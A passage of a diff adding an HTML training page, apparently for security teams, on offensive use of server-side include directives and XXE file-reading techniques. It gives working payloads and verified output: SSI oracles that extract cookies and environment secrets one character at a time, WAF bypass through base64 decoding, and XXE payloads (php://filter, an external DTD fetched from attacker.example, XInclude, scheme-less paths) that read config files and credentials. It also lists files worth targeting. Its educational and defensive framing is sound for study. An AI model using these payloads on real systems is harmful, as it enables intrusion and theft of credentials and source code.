+RCE on a learning-management system holding student records.</p>
+
+<p><strong>Discussion angles.</strong> The extension allow-list lesson &mdash; teams block
+<code>.php</code>, <code>.jsp</code>, <code>.asp</code> and forget <code>.shtml</code>,
+<code>.shtm</code>, <code>.stm</code>. Also a good vehicle for the defence discussion: serving
+uploads from a separate origin with SSI parsing disabled would have killed it regardless of the
+filter bug.</p>
+</section>
+<section id="directives">
+<h2><span class="n">Part 2</span>The SSI directives nobody covers</h2>
+<p>Excluding <code>include</code>, <code>printenv</code>, <code>config</code>, <code>echo</code> and
+<code>exec</code>, this is what remains across the four major implementations.</p>
+
+<div class="tw"><table>
+<thead><tr><th>Directive</th><th>Apache <code>mod_include</code></th><th>nginx</th><th>Tomcat</th><th>IIS</th></tr></thead>
+<tbody>
+<tr><td><strong><code>fsize</code></strong></td><td><span class="yes">yes</span></td><td><span class="na">&mdash;</span></td><td><span class="yes">yes</span></td><td><span class="yes">yes</span></td></tr>
+<tr><td><strong><code>flastmod</code></strong></td><td><span class="yes">yes</span></td><td><span class="na">&mdash;</span></td><td><span class="yes">yes</span></td><td><span class="yes">yes</span></td></tr>
+<tr><td><strong><code>set</code></strong></td><td><span class="yes">yes</span></td><td><span class="yes">yes</span></td><td><span class="yes">yes</span></td><td><span class="na">&mdash;</span></td></tr>
+<tr><td><strong><code>if</code>&nbsp;/&nbsp;<code>elif</code>&nbsp;/&nbsp;<code>else</code>&nbsp;/&nbsp;<code>endif</code></strong></td><td><span class="yes">ap_expr</span></td><td><span class="yes">1 nesting level</span></td><td><span class="yes">legacy grammar</span></td><td><span class="na">&mdash;</span></td></tr>
+<tr><td><strong><code>comment</code></strong></td><td><span class="yes">2.4.21+</span></td><td><span class="na">&mdash;</span></td><td><span class="na">&mdash;</span></td><td><span class="na">&mdash;</span></td></tr>
+<tr><td><strong><code>block</code>&nbsp;/&nbsp;<code>endblock</code></strong></td><td><span class="na">&mdash;</span></td><td><span class="yes">yes</span></td><td><span class="na">&mdash;</span></td><td><span class="na">&mdash;</span></td></tr>
+<tr><td><strong><code>perl</code></strong></td><td><span class="yes">via mod_perl</span></td><td><span class="na">&mdash;</span></td><td><span class="na">&mdash;</span></td><td><span class="na">&mdash;</span></td></tr>
+</tbody></table></div>
+
+<p>nginx&rsquo;s SSI module is deliberately incomplete: it has <strong>no <code>exec</code> and no
+<code>fsize</code>/<code>flastmod</code></strong>, which removes the command-execution sink entirely
+but leaves everything below.</p>
+
+<h3><span class="n">2.1</span><code>fsize</code> &mdash; a file-size oracle</h3><div class="blk code"><pre><code>&lt;!--#fsize file="report.pdf" --&gt;
+&lt;!--#fsize virtual="/downloads/report.pdf" --&gt;</code></pre></div><p>Output format follows <code>config sizefmt</code> (<code>bytes</code> or <code>abbrev</code>).</p>
+
+<div class="note"><span class="lbl">The two attributes are not equally dangerous</span>
+<p><code>file=</code> is deliberately restricted &mdash; the path may not start with <code>/</code>
+and may not contain <code>../</code>, so it cannot leave the current directory.
+<code>virtual=</code> takes a <strong>URL-path</strong>, resolved through the server&rsquo;s whole
+mapping layer: <code>Alias</code>, <code>ScriptAlias</code>, <code>Redirect</code>, mounted webapps.
+Anything the server can map, <code>virtual=</code> can measure.</p></div>
+
+<ul>
+<li><strong>Existence and size oracle for files with no readable content.</strong>
+<code>&lt;!--#fsize virtual="/.git/config" --&gt;</code> distinguishes &ldquo;not there&rdquo; from
+&ldquo;there, 312 bytes&rdquo;. Sweep for <code>.env</code>, <code>config.php.bak</code>,
+<code>WEB-INF/web.xml</code>, <code>backup.sql</code>, <code>id_rsa</code>.</li>
+<li><strong>Size as a side channel.</strong> Where the size of a resource is a function of a secret
+&mdash; a report containing only the records you may see, a compressed response, a key file whose
+length reveals the algorithm &mdash; the size alone leaks. The SSI analogue of a CRIME/BREACH-style
+oracle, without reading a byte.</li>
+<li><strong>Cross-application reach on Tomcat.</strong> <code>isVirtualWebappRelative</code> defaults
+to <strong>false</strong>, so <code>virtual=</code> paths resolve relative to the <em>server</em>
+root, not the context root. An SSI injection in one webapp can probe files belonging to every other
+webapp on the same Tomcat.</li>
+<li><strong>Documented quirk:</strong> for a CGI script, <code>fsize virtual=</code> returns the size
+of the <em>script file</em>, not of its output &mdash; metadata about code you cannot fetch.</li>
+</ul>
+
+<h3><span class="n">2.2</span><code>flastmod</code> &mdash; a timestamp oracle</h3><div class="blk code"><pre><code>&lt;!--#flastmod file="index.html" --&gt;
+&lt;!--#flastmod virtual="/WEB-INF/web.xml" --&gt;</code></pre></div><p>Same <code>file=</code> / <code>virtual=</code> split and the same restrictions as
+<code>fsize</code>; output format comes from <code>config timefmt</code>, a
+<code>strftime(3)</code> string.</p>
+<ul>
+<li><strong>Existence oracle</strong> with the same reach as <code>fsize</code>, and a second,
+independent signal when sizes collide.</li>
+<li><strong>Patch-state fingerprinting.</strong> The mtime of a framework file says when the app was
+last deployed or patched, which maps directly onto &ldquo;is CVE-X fixed here?&rdquo; &mdash; useful
+for choosing an exploit before firing one.</li>
+<li><strong>Write confirmation for a blind upload.</strong> With an upload primitive but no visible
+result, <code>flastmod</code> on the guessed path confirms both the path and the moment your file
+landed, converting a blind file-write into a reliable one.</li>
+<li><strong>Deployment-schedule intelligence.</strong> Sampling mtimes across a site reveals release
+cadence and which components are hand-edited on the box.</li>
+<li>With <code>config timefmt="%s"</code> the output is a raw epoch integer &mdash; convenient for
+scripted differential probing.</li>
+</ul>
+
+<h3><span class="n">2.3</span><code>set</code> &mdash; the sleeper of the whole set</h3><div class="blk code"><pre><code>&lt;!--#set var="category" value="help" --&gt;
+&lt;!--#set encoding="none"   var="x" value="$QUERY_STRING" --&gt;
+&lt;!--#set decoding="base64" var="y" value="PCEtLSNleGVjIC4uLg==" --&gt;</code></pre></div><p>Attributes: <code>var</code>, <code>value</code>, and &mdash; added in 2.4 &mdash;
+<code>decoding</code> and <code>encoding</code>, each accepting <code>none</code>, <code>url</code>,
+<code>urlencoded</code>, <code>base64</code>, <code>entity</code>, comma-separated for multiple
+passes. Both <strong>must appear before <code>var</code></strong>. Decodings are stripped first, then
+encodings applied.</p>
+
+<p>It looks like the most boring directive in the list. It is the most useful one.</p>
+
+<ul>
+<li><strong><code>decoding=</code> is a filter and WAF bypass primitive.</strong> The whole point of
+the attribute is to strip an encoding layer <em>inside the server</em>. A payload that a WAF, an
+input validator or an HTML sanitiser never recognised &mdash; because it was base64 or
+percent-encoded when it went past them &mdash; is decoded after the fact. Any signature matching the
+literal string <code>&lt;!--#exec</code> is defeated by carrying the payload through
+<code>set decoding="base64"</code>.</li>
+<li><strong><code>encoding="none"</code> re-enables XSS.</strong> Apache&rsquo;s default output
+encoding is <code>entity</code>; writing <code>encoding="none"</code> opts out. Tomcat&rsquo;s
+documentation carries the same warning explicitly: <em>&ldquo;Using an encoding other than entity
+can lead to security issues.&rdquo;</em> That is precisely the class of bug CVE-2019-0221 was.</li>
+<li><strong>Environment poisoning.</strong> Per the Apache manual, variables created with
+<code>set</code> are <strong>exported into the request environment</strong> and visible to
+<code>reqenv()</code>/<code>v()</code> in later expressions &mdash; and to anything downstream that
+reads the request env: <code>#exec</code> children, CGI scripts, <code>mod_rewrite</code>
+conditions, env-based access control (<code>Require env=...</code>), <code>SetEnvIf</code>-driven
+logic. One <code>set</code> can rewrite a decision made much later in the request.</li>
+<li><strong>Second-order injection.</strong> Variable substitution (<code>$var</code>,
+<code>${var}</code>) happens inside quoted strings in <code>config</code>, <code>exec</code>,
+<code>flastmod</code>, <code>fsize</code>, <code>include</code>, <code>echo</code> and
+<code>set</code> itself. A value the attacker controls in one directive becomes an operand of
+another &mdash; the SSI equivalent of a gadget chain.
+<code>&lt;!--#set var="p" value="$QUERY_STRING" --&gt;</code> followed anywhere later by
+<code>&lt;!--#include virtual="/x/$p" --&gt;</code> is a path-traversal sink.</li>
+<li><strong>Cheap self-reference:</strong> values may reference other variables, so <code>set</code>
+gives you string concatenation; with <code>if</code> you also have branching and state &mdash; a very
+small programming language reachable from a single injected comment.</li>
+</ul>
+
+<h3><span class="n">2.4</span><code>if</code> / <code>elif</code> / <code>else</code> / <code>endif</code> &mdash; the boolean oracle</h3><div class="blk code"><pre><code>&lt;!--#if expr="test_condition" --&gt;   ...
+&lt;!--#elif expr="test_condition" --&gt; ...
+&lt;!--#else --&gt;                       ...
+&lt;!--#endif --&gt;</code></pre></div><p><code>endif</code> is mandatory; <code>elif</code> and <code>else</code> are optional.
+<strong>Three different expression grammars exist and teams should not mix them up:</strong></p>
+<ul>
+<li><strong>Apache 2.4</strong> uses <code>ap_expr</code>, the same language as <code>&lt;If&gt;</code>
+and <code>RewriteCond expr=</code>. <code>mod_include</code> additionally exposes the shorthand
+<code>v()</code>.</li>
+<li><strong>Apache with <code>SSILegacyExprParser on</code></strong> falls back to the 2.2 grammar.</li>
+<li><strong>Tomcat</strong> implements the legacy grammar only. Reading its
+<code>ExpressionTokenizer</code>, the supported tokens are exactly <code>=</code>, <code>!=</code>,
+<code>&lt;</code>, <code>&lt;=</code>, <code>&gt;</code>, <code>&gt;=</code>, <code>&amp;&amp;</code>,
+<code>||</code>, <code>!</code>, <code>(</code>, <code>)</code> and strings; a right-hand side of the
+form <code>/regex/</code> is a regex match. There are <strong>no file-test operators at all</strong>.</li>
+</ul>
+
+<div class="tw"><table>
+<thead><tr><th>Available inside <code>mod_include</code></th><th>Restricted &mdash; <em>not</em> available</th></tr></thead>
+<tbody>
+<tr><td><code>req()</code>, <code>resp()</code>, <code>reqenv()</code>/<code>v()</code>, <code>osenv()</code>, <code>note()</code>, <code>env()</code></td><td><code>file()</code> &mdash; read a file&rsquo;s contents</td></tr>
+<tr><td><code>base64()</code>, <code>unbase64()</code>, <code>md5()</code>, <code>sha1()</code></td><td><code>filesize()</code></td></tr>
+<tr><td><code>escape()</code>, <code>unescape()</code>, <code>escapehtml()</code>, <code>replace()</code>, <code>tolower()</code>, <code>toupper()</code>, <code>ldap()</code></td><td><code>filemod()</code></td></tr>
+<tr><td><code>-U</code> / <code>-A</code> (URL accessible?), <code>-F</code> (file accessible?), <code>-R</code> (client IP in CIDR), <code>-n</code>, <code>-z</code>, <code>-T</code></td><td><code>-d</code>, <code>-e</code>, <code>-f</code>, <code>-s</code>, <code>-L</code>, <code>-h</code></td></tr>
+<tr><td><code>=~</code>, <code>!~</code>, <code>-strmatch</code>, <code>-fnmatch</code>, <code>-ipmatch</code>, <code>-in</code>, all numeric comparisons</td><td></td></tr>
+</tbody></table></div>
+
+<div class="note warn"><span class="lbl">Correct a very common claim</span>
+<p>Apache&rsquo;s expression manual marks <code>file</code>, <code>filesize</code>,
+<code>filemod</code> and the <code>-d -e -f -s -L -h</code> operators <strong>restricted</strong>, and
+states plainly: <em>&ldquo;The operators marked as &lsquo;restricted&rsquo; are not available in some
+modules like <code>mod_include</code>.&rdquo;</em> So the frequently-repeated payload
+<code>&lt;!--#if expr="file('/etc/passwd')" --&gt;</code> <strong>does not read
+<code>/etc/passwd</code> on Apache</strong>. Say so in the presentation; it is the kind of detail
+that separates a real write-up from a copy-pasted one.</p></div>
+
+<p><strong>Impact of what <em>is</em> available.</strong></p>
+<ul>
+<li><strong>A one-bit read channel out of any SSI injection.</strong> Even with <code>exec</code>
+disabled, <code>echo</code> filtered and no output reflected, a conditional whose two branches differ
+turns any variable into an extractable secret, one character per request:</li>
+</ul><div class="blk code"><pre><code>&lt;!--#if expr="reqenv('HTTP_COOKIE') =~ /^SESSION=a/" --&gt;Y&lt;!--#else --&gt;N&lt;!--#endif --&gt;</code></pre></div><ul>
+<li>Binary-search each position with <code>-strmatch</code> and the value falls out in
+<code>O(log&#8322;(alphabet) &times; length)</code> requests. The same trick against
+<code>osenv()</code> reads process environment variables such as
+<code>AWS_SECRET_ACCESS_KEY</code> or <code>DB_PASSWORD</code>.</li>
+<li><strong><code>-U</code> / <code>-A</code> are an authorisation-aware existence oracle.</strong>
+They answer &ldquo;is this URL reachable <em>through all of the server&rsquo;s configured access
+controls</em>&rdquo; by issuing an <strong>internal subrequest</strong>. That maps the internal URL
+space, including endpoints an external request would be blocked from &mdash; admin panels behind
+<code>Require ip</code>, internal-only vhost aliases. <code>-F</code> does the same for filesystem
+paths.</li>
+<li><strong><code>-U</code>/<code>-F</code> are also a DoS lever.</strong> The Apache manual&rsquo;s
+own words: <em>&ldquo;This uses an internal subrequest to do the check, so use it with care &mdash;
+it can impact your server&rsquo;s performance!&rdquo;</em> One injected page containing a loop of
+<code>-U</code> tests amplifies a single request into hundreds of internal subrequests.</li>
+<li><strong><code>unbase64()</code> / <code>unescape()</code> are decode-after-the-filter
+primitives</strong>, the same bypass shape as <code>set decoding=</code>.</li>
+<li><strong><code>-R "10.0.0.0/8"</code></strong> reveals how the server classifies the client &mdash;
+useful for finding which proxy header the server actually trusts.</li>
+<li><strong>nginx caveat:</strong> its <code>if</code> supports only <em>one</em> nesting level, and
+expressions are limited to variable existence, <code>=</code>/<code>!=</code> against text, and
+<code>=</code>/<code>!=</code> against a <code>/regex/</code> &mdash; but that regex supports
+positional and named captures, readable afterwards through <code>echo</code>, giving a genuine
+extract-and-reflect primitive. <code>ssi_value_length</code> (default 256) caps parameter length and
+is a real constraint when building payloads there.</li>
+</ul>
+
+<h3><span class="n">2.5</span><code>comment</code> &mdash; the quiet canary (Apache 2.4.21+)</h3><div class="blk code"><pre><code>&lt;!--#comment Blah Blah Blah --&gt;
+&lt;!--#comment text="Blah Blah Blah" --&gt;</code></pre></div><p>It produces no output. That is exactly what makes it useful offensively.</p>
+<ul>
+<li><strong>Zero-noise detection.</strong> Inject <code>&lt;!--#comment x --&gt;</code> and watch it
+<em>disappear</em> from the response: proof the SSI filter is parsing your input, without emitting a
+command, touching the filesystem, tripping a WAF rule that looks for <code>exec</code> or
+<code>include</code>, or leaving anything visible to a defender reviewing the rendered page. If it
+comes back verbatim, SSI is not parsing that sink.</li>
+<li><strong>Version fingerprinting.</strong> It exists only from 2.4.21. A server that swallows
+<code>#comment</code> where a sibling host rejects it as an unknown element tells you which of the
+two is older, narrowing CVE applicability before you commit to an exploit.</li>
+<li>The defensive note: since it renders nothing, an injected <code>#comment</code> is invisible in a
+page diff. Detection has to happen at the input, not the output.</li>
+</ul>
+
+<h3><span class="n">2.6</span><code>block</code> / <code>endblock</code> &mdash; nginx only</h3><div class="blk code"><pre><code>&lt;!--# block name="one" --&gt;fallback content&lt;!--# endblock --&gt;
+&lt;!--# include virtual="/remote/body.php" stub="one" --&gt;</code></pre></div><p>Defines a named stub that <code>include</code> renders <strong>if the subrequest returns an
+empty body or errors</strong>. Blocks may contain other SSI commands.</p>
+<ul>
+<li><strong>Error oracle for internal subrequests.</strong> Because the stub renders precisely on
+failure, <code>block</code> + <code>include stub=</code> is a clean success/failure signal for
+probing internal endpoints &mdash; the nginx equivalent of Apache&rsquo;s <code>-U</code>.</li>
+<li><strong>Staged payloads.</strong> Content that renders only in a specific server state keeps a
+payload dormant until a condition holds, and smuggles markup past a filter that inspects rendered
+output rather than the template.</li>
+<li>The related non-standard <code>include</code> parameters deserve naming even though
+<code>include</code> is out of scope: <code>set="var"</code> writes a subrequest&rsquo;s
+<strong>response body into a variable</strong> (bounded by
+<code>subrequest_output_buffer_size</code>), upgrading nginx SSI from &ldquo;include a page&rdquo; to
+&ldquo;fetch an internal URL and read it back&rdquo; &mdash; a first-class SSRF-with-response
+primitive. <code>wait="yes"</code> serialises subrequests, which makes exploitation
+deterministic.</li>
+</ul>
+
+<h3><span class="n">2.7</span><code>perl</code> &mdash; mod_perl only</h3><div class="blk code"><pre><code>&lt;!--#perl sub="Package::handler" arg="value" --&gt;</code></pre></div><p>Available when httpd is built and configured with mod_perl SSI support (historically
+<code>-DUSE_PERL_SSI</code>). It calls a Perl subroutine directly in the server&rsquo;s embedded
+interpreter.</p>
+<p><strong>Impact.</strong> In-process code execution with no <code>fork</code>, no subrequest, and
+none of the access checks <code>include virtual</code> performs &mdash; mod_perl&rsquo;s
+documentation sells exactly that as the performance benefit, which is the same sentence read as a
+threat model. Any sub reachable in the interpreter&rsquo;s namespace becomes callable from injected
+markup, so the blast radius is &ldquo;every module loaded into the server&rdquo;, not &ldquo;every
+binary in <code>$PATH</code>&rdquo;.</p>
+
+<h3><span class="n">2.8</span>Configuration directives worth knowing</h3>
+<p>These are <code>mod_include</code>&rsquo;s httpd-config directives rather than in-page elements,
+but they decide what the in-page elements can do.</p>
+
+<div class="tw"><table>
+<thead><tr><th>Directive</th><th>Why it matters</th></tr></thead>
+<tbody>
+<tr><td><code>Options +Includes</code> vs <code>IncludesNOEXEC</code></td><td><code>IncludesNOEXEC</code> keeps SSI but kills <code>#exec</code> and CGI execution via <code>#include virtual</code>. This is the control CVE-2009-1195 broke.</td></tr>
+<tr><td><code>SSIStartTag</code> / <code>SSIEndTag</code></td><td>Default <code>&lt;!--#</code> and <code>--&gt;</code>. If a site sets <code>SSIStartTag "&lt;%"</code>, every payload in every cheat sheet silently fails &mdash; and conversely a non-default tag can collide with an existing template syntax and widen the injection surface.</td></tr>
+<tr><td><code>SSILegacyExprParser</code></td><td>Switches <code>#if</code> back to the 2.2 grammar, changing which of the operators above exist.</td></tr>
+<tr><td><code>SSIUndefinedEcho</code></td><td>Default <code>(none)</code>. The string returned for an undefined variable is itself an oracle: it distinguishes &ldquo;unset&rdquo; from &ldquo;set to empty&rdquo;.</td></tr>
+<tr><td><code>SSIETag</code> / <code>SSILastModified</code></td><td>Off by default because SSI output is dynamic; turning them on re-introduces cacheability, and therefore cache-poisoning reach, for attacker-influenced output.</td></tr>
+<tr><td><code>XBitHack on|off|full</code></td><td>Makes any <code>text/html</code> file with the user-execute bit set SSI-parsed. <code>full</code> also serves a <code>Last-Modified</code> from the file &mdash; the manual warns to use it carefully with dynamic content, i.e. it lets caches store SSI output.</td></tr>
+<tr><td>Tomcat <code>allowExec</code>, privileged contexts</td><td>Tomcat ships SSI disabled and <code>#exec</code> off (<code>allowExec</code> defaults to <code>false</code>); both must be deliberately enabled, and only privileged contexts may use SSI at all.</td></tr>
+</tbody></table></div>
+</section>
+<section id="source">
+<h2><span class="n">Part 3</span>Reading application source code with XXE</h2>
+
+<h3><span class="n">3.1</span>Why the naive payload fails</h3>
+<p>Application source is not XML-safe. Feed it into an entity and the parser chokes on the first
+<code>&lt;?</code>, <code>&lt;</code> or <code>&amp;</code> it meets.</p><div class="blk term"><div class="blk-label">verified output</div><pre><code>RAW php source via bare path   =&gt; (parse failed)  [ParsePI: PI php never end ...]
+
+# and where the file merely contains an '&amp;', the CDATA route fails differently:
+ERR: EntityValue: '&amp;' forbidden except for entities references</code></pre></div><p>So &ldquo;read <code>/etc/passwd</code>&rdquo; works and &ldquo;read
+<code>index.php</code>&rdquo; does not, for the same payload. Three techniques get around it.</p>
+
+<h3><span class="n">3.2</span>Technique 1 &mdash; <code>php://filter</code> base64 (PHP targets)</h3>
+<p>Wrap the file in a stream filter so the parser only ever sees
+<code>A&ndash;Z a&ndash;z 0&ndash;9 + / =</code>.</p><div class="blk code"><pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE r [
+  &lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php"&gt;
+]&gt;
+&lt;r&gt;&amp;xxe;&lt;/r&gt;</code></pre></div><div class="blk term"><div class="blk-label">verified output</div><pre><code>D php://filter base64        =&gt; U0VDUkVUX0ZMQUc9Y3UtY3J5cHRvLTIwMjYKZGJfcGFzc3dvcmQ9UEBzc3cwcmQK
+E php://filter read= form    =&gt; PD9waHAKJGRicGFzcyA9ICJodW50ZXIyIjsgLy8gc291cmNlIHdpdGggPCAmID4gY2hhcn...
+F php://filter on raw source =&gt; (parse failed)</code></pre></div><p>Note line <strong>F</strong>: <code>php://filter/resource=&hellip;</code> with no conversion is
+just <code>file://</code> with extra steps, and fails identically. The base64 conversion is the whole
+point. <code>read=convert.base64-encode/resource=</code> is an equivalent spelling; other useful
+conversions are <code>convert.quoted-printable-encode</code> and <code>string.rot13</code> &mdash;
+though rot13 still fails on real source, since the metacharacters survive it.</p>
+
+<div class="note warn"><span class="lbl">Filter chains do not survive libxml2</span>
+<p>PHP itself accepts <code>zlib.deflate|convert.base64-encode</code>, but inside XXE the
+<code>|</code> breaks libxml2&rsquo;s URI parser, and percent-encoding it as <code>%7C</code>
+silently drops the chain rather than applying it. <strong>Use exactly one filter inside XXE.</strong></p></div><div class="blk term"><div class="blk-label">verified output</div><pre><code>$ php -r '...file_get_contents("php://filter/zlib.deflate|convert.base64-encode/resource=app.php")...'
+string(40) "DYxNCoAgFAb3nuJDHlIrqW1WZ/EvnpsULVpEd8/V"      # PHP is fine with it
+
+filter chain deflate+base64      =&gt; (parse failed)  [Invalid URI: php://filter/zlib.deflate|convert...]
+php://filter chain (%7C encoded) =&gt; ParsePI: PI php never end ...   (chain not applied)</code></pre></div><h3><span class="n">3.3</span>Technique 2 &mdash; CDATA wrapping (parser-agnostic)</h3>
+<p>Build the string <code>&lt;![CDATA[</code> + file + <code>]]&gt;</code> out of three parameter
+entities, so the file content lands inside a CDATA section where <code>&lt;</code> and
+<code>&gt;</code> are literal data. The concatenation must happen in an <strong>external</strong> DTD
+&mdash; see &sect;5.2 for why.</p><div class="blk code"><div class="blk-label">evil.dtd</div><pre><code>&lt;!ENTITY % start "&lt;![CDATA["&gt;
+&lt;!ENTITY % data  SYSTEM "/var/www/html/config.php"&gt;
+&lt;!ENTITY % end   "]]&gt;"&gt;
+&lt;!ENTITY % joined "&lt;!ENTITY all '%start;%data;%end;'&gt;"&gt;</code></pre></div><div class="blk code"><div class="blk-label">payload</div><pre><code>&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE r [
+  &lt;!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd"&gt;
+  %dtd;
+  %joined;
+]&gt;
+&lt;r&gt;&amp;all;&lt;/r&gt;</code></pre></div><p><strong>It works, with one hard limit.</strong> Against a file containing <code>&lt;</code>,
+<code>&gt;</code> and <code>"</code> but no <code>&amp;</code>:</p><div class="blk term"><div class="blk-label">verified output</div><pre><code>=== CDATA wrap, file with &lt; &gt; but no &amp; ===
+  | &lt;?php
+  | class Auth { // no ampersands here
+  |   public $key = "AKIA-EXAMPLE";
+  |   function ok($u) { if ($u-&gt;id &gt; 0) return true; }
+  | }
+
+=== same technique, file containing '&amp;&amp;' ===
+  ERR: EntityValue: '&amp;' forbidden except for entities references
+  ERR: Entity 'all' not defined</code></pre></div><p><strong>Conclusion: CDATA wrapping neutralises <code>&lt;</code> and <code>&gt;</code> but not
+<code>&amp;</code> or <code>%</code></strong>, because the file&rsquo;s bytes are spliced into an
+<em>entity value</em>, where those two characters are still markup. Real source
+(<code>&amp;&amp;</code>, <code>$a &amp; $b</code>, <code>&amp;amp;</code> in templates, HTML
+entities) will usually contain one. Treat CDATA as the fallback for Java and .NET, where
+<code>php://filter</code> does not exist &mdash; not as a general solution.</p>
+
+<h3><span class="n">3.4</span>Technique 3 &mdash; XInclude with <code>parse="text"</code></h3>
+<p>This is the technique most write-ups skip, and it is better than both of the above.</p><div class="blk code"><pre><code>&lt;root xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include parse="text" href="/var/www/html/config.php"/&gt;
+&lt;/root&gt;</code></pre></div><p><code>parse="text"</code> tells the processor to insert the resource as <strong>character
+data</strong> rather than parse it as XML, so the file&rsquo;s <code>&lt;</code>,
+<code>&amp;</code> and <code>&gt;</code> are simply escaped on the way in. It reads raw source with
+no encoding wrapper at all, in both stacks:</p><div class="blk term"><div class="blk-label">verified output</div><pre><code>--- does XInclude parse=text read RAW source (no php://filter)? ---
+XInclude text, raw app.php (has &lt; &amp; &gt;)  =&gt; n=1 GOT: &lt;?php\n$dbpass = "hunter2"; // source with &lt; &amp; &gt; chars\nif ($a...
+
+--- Java ---
+XIncludeAware=false (no DOCTYPE, bare path) =&gt; (nothing)
+XIncludeAware=true  (no DOCTYPE, bare path) =&gt; LEAKED: SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd</code></pre></div><p>Three advantages over classic XXE: it needs <strong>no <code>DOCTYPE</code></strong> (so it
+survives <code>disallow-doctype-decl</code>), it needs <strong>no entity substitution</strong> (so it
+survives <code>LIBXML_NOENT</code> being absent), and it handles arbitrary bytes. Its one requirement
+is an XInclude-aware processor &mdash; <code>setXIncludeAware(true)</code> in Java, an explicit
+<code>-&gt;xinclude()</code> call in PHP DOM, on by default in some XML libraries and pipelines. It
+also composes with <code>php://filter</code> when you want base64 anyway.</p>
+
+<h3><span class="n">3.5</span>Where to point it</h3>
+<p>Reading source is only useful once you know the path. Useful anchors:</p>
+
+<div class="tw"><table>
+<thead><tr><th>Target</th><th>Why</th></tr></thead>
+<tbody>
+<tr><td><code>/proc/self/cwd/&lt;file&gt;</code></td><td>Linux: resolves relative to the <em>process&rsquo;s</em> working directory &mdash; sidesteps not knowing the docroot</td></tr>
+<tr><td><code>/proc/self/environ</code>, <code>/proc/self/cmdline</code></td><td>env vars and argv of the parsing process; often carries <code>DB_PASSWORD</code>, <code>SECRET_KEY</code></td></tr>
+<tr><td><code>/proc/self/maps</code>, <code>/proc/self/fd/N</code></td><td>loaded paths; open descriptors, including deleted files still held open</td></tr>
+<tr><td><code>WEB-INF/web.xml</code> &rarr; <code>WEB-INF/classes/&hellip;</code></td><td>Java: the deployment descriptor names the servlet classes; enumerate from there</td></tr>
+<tr><td><code>application.properties</code>, <code>application.yml</code></td><td>Spring Boot credentials</td></tr>
+<tr><td><code>.env</code>, <code>config.php</code>, <code>wp-config.php</code>, <code>settings.py</code></td><td>PHP / WordPress / Django credentials</td></tr>
+<tr><td><code>/etc/apache2/sites-enabled/*.conf</code>, <code>/etc/nginx/nginx.conf</code></td><td>resolves <code>DocumentRoot</code> when nothing else does</td></tr>
+<tr><td><code>pom.xml</code>, <code>composer.json</code>, <code>package.json</code></td><td>dependency versions &rarr; known-CVE selection</td></tr>
+</tbody></table></div>
+
+<p>For Java specifically, <code>jar:file:///path/app.war!/WEB-INF/web.xml</code> reads straight out
+of a deployed archive.</p>
+</section>
+<section id="nofile">
+<h2><span class="n">Part 4</span>Reading files without <code>file://</code></h2>
+<p>Measured results. <em>PHP</em> = PHP 8.4.19 / libxml 2.9.14 via
+<code>simplexml_load_string(&hellip;, LIBXML_NOENT|LIBXML_DTDLOAD)</code>; <em>Java</em> = OpenJDK
+21.0.10 via a default <code>DocumentBuilderFactory</code>.</p>
+
+<div class="tw"><table>
+<thead><tr><th>Technique</th><th>System identifier</th><th>PHP</th><th>Java</th></tr></thead>
+<tbody>
+<tr><td><strong>No scheme, absolute path</strong></td><td><code>SYSTEM "/etc/passwd"</code></td><td><span class="yes">works</span></td><td><span class="yes">works</span></td></tr>
+<tr><td><strong>No scheme, relative path</strong></td><td><code>SYSTEM "secret.txt"</code></td><td><span class="yes">works</span></td><td><span class="yes">works</span></td></tr>
+<tr><td><strong>PHP stream filter</strong></td><td><code>php://filter/convert.base64-encode/resource=/etc/passwd</code></td><td><span class="yes">works</span></td><td><span class="na">n/a</span></td></tr>
+<tr><td><strong>zlib wrapper</strong></td><td><code>compress.zlib:///etc/passwd</code></td><td><span class="yes">works</span></td><td><span class="na">n/a</span></td></tr>
+<tr><td><strong>phar wrapper</strong></td><td><code>phar:///path/bundle.zip/conf/db.txt</code></td><td><span class="yes">works</span></td><td><span class="na">n/a</span></td></tr>
+<tr><td><strong>data wrapper</strong> (payload staging)</td><td><code>data://text/plain;base64,&hellip;</code></td><td><span class="yes">works</span></td><td><span class="na">n/a</span></td></tr>
+<tr><td><strong>Java archive</strong></td><td><code>jar:file:///path/app.war!/WEB-INF/web.xml</code></td><td><span class="na">n/a</span></td><td><span class="yes">works</span></td></tr>
+<tr><td><strong>XInclude, no DOCTYPE</strong></td><td><code>&lt;xi:include parse="text" href="/etc/passwd"/&gt;</code></td><td><span class="yes">works</span></td><td><span class="yes">XIncludeAware</span></td></tr>
+<tr><td>zip wrapper</td><td><code>zip:///path/a.zip#entry</code></td><td><span class="no">fragment rejected</span></td><td><span class="na">n/a</span></td></tr>
+<tr><td>glob wrapper</td><td><code>glob:///path/*.txt</code></td><td><span class="no">not a stream</span></td><td><span class="na">n/a</span></td></tr>
+<tr><td><code>netdoc:</code></td><td><code>netdoc:/etc/passwd</code></td><td><span class="na">n/a</span></td><td><span class="no">removed in JDK 9</span></td></tr>
+<tr><td><code>expect://</code></td><td><code>expect://id</code></td><td><span class="na">ext absent</span></td><td><span class="na">n/a</span></td></tr>
+<tr><td><code>http(s)://</code>, <code>ftp://</code></td><td>network fetch, not a local read</td><td><span class="na">SSRF</span></td><td><span class="na">SSRF</span></td></tr>
+</tbody></table></div>
+
+<h3><span class="n">4.1</span>The best answer: drop the scheme entirely</h3>
+<p>A <code>SYSTEM</code> identifier is a <strong>URI reference</strong>, resolved against the
+document&rsquo;s base URI. Both libxml2 and the JDK fall back to opening a scheme-less reference as a
+local path.</p><div class="blk code"><pre><code>&lt;!DOCTYPE r [ &lt;!ENTITY xxe SYSTEM "/etc/passwd"&gt; ]&gt;
+&lt;r&gt;&amp;xxe;&lt;/r&gt;</code></pre></div><div class="blk term"><div class="blk-label">verified output</div><pre><code>A file:// (baseline)             =&gt; SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
+B bare absolute path (no scheme) =&gt; SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd
+C bare relative path             =&gt; SECRET_FLAG=cu-crypto-2026\ndb_password=P@ssw0rd</code></pre></div><p>Identical in Java. This defeats every filter that blocklists the string <code>file://</code>
+&mdash; which is most of the naive ones. Relative paths additionally resolve against the
